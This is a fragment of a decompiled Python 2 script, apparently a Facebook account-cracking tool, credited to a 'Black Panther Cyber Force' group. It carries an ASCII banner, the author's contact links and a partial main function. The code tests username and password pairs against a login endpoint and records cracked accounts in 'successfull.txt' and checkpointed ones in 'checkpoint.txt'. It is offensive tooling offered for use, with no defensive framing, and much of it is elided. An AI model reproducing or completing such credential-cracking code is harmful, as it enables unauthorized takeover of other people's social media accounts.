# BLACK PANTHER CYBER FORCE
# Decompile by Mardis (Tools By NONITA)
...
██   ████  ██████  ██████  ██    ██    ██   ██     
  ...
  Auther  :  🄽🄾🄱🄸🅃🄰                                Github  :  nobita2260
whatapps:  01813233621
Facebook:https://www.facebook.com/nobita2260
message:https://m.me/nobita2260
public group:https://facebook.com/groups/1175388446323389/
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[*_*NOBITA Successful*_*]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('NOBITA/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '[NOBITA(CP) Login After 3 Days] ' + k + c + user + ' | ' + pass1 + '\n'
                cps = open('NOBITA/checkpoint.txt', 'a')
